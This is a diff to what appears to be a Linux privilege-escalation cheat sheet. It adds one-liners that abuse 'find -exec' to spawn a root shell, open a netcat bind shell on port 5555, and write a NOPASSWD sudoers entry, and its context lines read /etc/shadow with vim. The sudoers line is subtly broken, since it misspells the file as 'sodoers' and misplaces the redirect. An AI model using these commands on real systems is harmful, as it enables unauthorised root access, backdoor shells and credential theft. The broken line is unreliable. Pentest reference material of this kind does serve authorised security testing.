@@ -23,8 +23,9 @@ nmap> !sh
 find  
 `find <file> -exec <CMD> \;`  
 Escalation to root shell  
-`find pentestlab -exec netcat -lvp 5555 -e /bin/sh \;`
-
+`find . -exec /bin/sh -p \; -quit`  
+`find somefile -exec netcat -lvp 5555 -e /bin/sh \;`  
+`find somefile -exec echo "lowprivuser ALL=(ALL) NOPASSWD:ALL" > /etc/sodoers \;`  
 Vim  
 ```
 vim /etc/shadow  
